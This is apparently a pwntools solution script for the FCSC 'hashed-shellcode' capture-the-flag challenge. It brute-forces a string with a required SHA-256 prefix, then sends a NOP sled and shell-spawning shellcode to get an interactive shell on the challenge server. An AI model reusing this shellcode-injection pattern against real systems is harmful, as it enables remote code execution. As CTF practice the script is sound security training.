from pwn import *
from hashlib import sha256
from string import ascii_letters
from itertools import product

if args.LOCAL:
    io = process('./hashed-shellcode')
    if args.GDB:
        cmd = """
        brva 0x00000000000014DD
        """
        gdb.attach(io, cmd)
else:
    io = remote('challenges.france-cybersecurity-challenge.fr', 2107)

elf = context.binary = ELF('./hashed-shellcode')

# start = "FCSC_"
# end = ""
# for end in product(ascii_letters, repeat=11-len(start)):
#     end = "".join(end)
#     hash = sha256((start + end).encode()).hexdigest()
#     if hash[:8] == "525e0f05":
#         print(start + end)
#         print(hash)
#         break

# output FCSC_jdijOI
# res = start+end
res = b'FCSC_jdijOI'
io.sendline(res)

sleep(0.1)
pl = asm(shellcraft.sh())

io.sendline(b'\x90'*0x100+pl)

io.interactive()